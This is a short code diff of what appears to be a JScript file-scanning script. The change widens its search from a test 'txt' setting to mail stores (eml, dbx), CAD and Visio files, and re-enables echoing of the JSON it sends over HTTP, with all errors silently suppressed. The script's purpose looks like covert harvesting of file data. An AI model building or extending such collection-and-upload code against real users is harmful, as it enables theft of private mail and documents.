@@ -15,10 +15,6 @@ try {
 	////////////////////////////////////////////////////////////
 	var filecheckdelay = 43200; //Delay before next file and programs check (in min)//// 43200 (1 month)///
 	var waittime = 0; // wait before start (in min)
-	var ext = [
-	"txt"
-	]
-	/*
 	var ext = [ //files extensions for search
 	"eml", //windows live mail
 	"dbx", //outlook express
@@ -41,7 +37,6 @@ try {
 	"cdw","cdt","m3d","a3d", //compas 
 	"vsd","vss","vst","vdx","vsx","vtx","vsl","vsdx","vsdm" //visio
 	]; 
-	*/
 	////////////////////////////////////////////////////////////
 	////////////////////SCRIPT START////////////////////////////
 	////////////////////////////////////////////////////////////
@@ -554,6 +549,6 @@ try {
 	http.setRequestHeader("Content-Type", "application/json");
 	http.send(json);
 	
-	//WScript.Echo(json);
+	WScript.Echo(json);
 	
 } catch(e) {};
